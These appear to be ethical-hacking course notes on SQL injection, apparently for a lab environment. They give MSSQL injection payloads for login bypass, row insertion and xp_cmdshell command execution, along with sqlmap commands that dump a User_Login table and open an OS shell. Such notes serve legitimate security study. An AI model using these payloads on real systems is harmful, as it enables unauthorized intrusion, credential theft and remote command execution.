# 15: SQL Injection

Types:
- In-band SQL injection
- Blind/inferential SQL injection (no error messages from the system)
- Out-of-band SQL injection (such as database email functionality, or file writing and loading functions)

## Perform Attacks

### Attack MSSQL
``` blah' or 1=1 -- ```

``` blah';insert into login values ('john','apple123'); -- ```

``` blah';create database mydatabase; --  ```

``` blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; -- ```

### Extract Databases by sqlmap

``` sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value copied]" --dbs ```\
- get databases, and information about the web server OS, web application technology, and the backend DBMS.

``` sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value copied]" -D moviescope --tables ```\
- -D specifies the DBMS database to enumerate 
- --tables enumerates DBMS database tables

``` sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value copied]" -D moviescope -T User_Login --dump ```\
- Dump the table named "User_Login"

``` sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value copied]" --os-shell ```
- --os-shell is the prompt for an interactive OS shell

``` os-shell> TASKLIST ```

### Other SQL injection tools
- Mole (https://sourceforge.net), 
- Blisqy (https://github.com), 
- blind-sql-bitshifting (https://github.com), 
- bsql (https://github.com), and 
- NoSQLMap (https://github.com) 

## Detect SQL Injection Vulnerabilities

